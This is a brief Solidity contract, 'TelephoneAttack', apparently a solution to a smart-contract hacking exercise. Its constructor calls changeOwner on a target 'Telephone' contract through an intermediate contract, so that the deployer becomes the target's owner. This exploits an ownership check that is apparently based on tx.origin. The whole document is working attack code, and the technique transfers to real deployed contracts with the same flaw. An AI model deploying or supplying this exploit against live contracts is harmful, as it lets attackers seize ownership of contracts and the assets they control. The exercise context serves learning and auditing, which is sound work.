contract TelephoneAttack {
    Telephone target;
    
    constructor(address _target) public {
        target = Telephone(_target);
        target.changeOwner(msg.sender);
    }
}